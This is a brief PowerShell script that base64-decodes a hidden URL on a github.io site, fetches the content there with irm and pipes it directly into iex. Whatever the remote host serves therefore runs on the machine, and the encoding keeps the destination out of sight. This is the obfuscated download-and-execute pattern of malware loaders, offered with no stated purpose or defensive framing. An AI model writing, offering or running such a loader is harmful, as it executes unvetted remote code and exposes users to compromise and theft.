# PowerShell script

[string]$Base64String = "aHR0cHM6Ly9saTEzNDU4MjUxMzguZ2l0aHViLmlvL3MvN2Y0NThjMDM3YmRmYzUwZDUxZTA3ZGNhMTBmMTI5ZDcyNDFkN2QwOWI1YTBmNzcyN2Q3MzJmNWZkODIwOTU4ZA=="

try {
    $bytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
    irm $decodedString | iex
}
catch {
    Write-Error "Failed Parse code"
}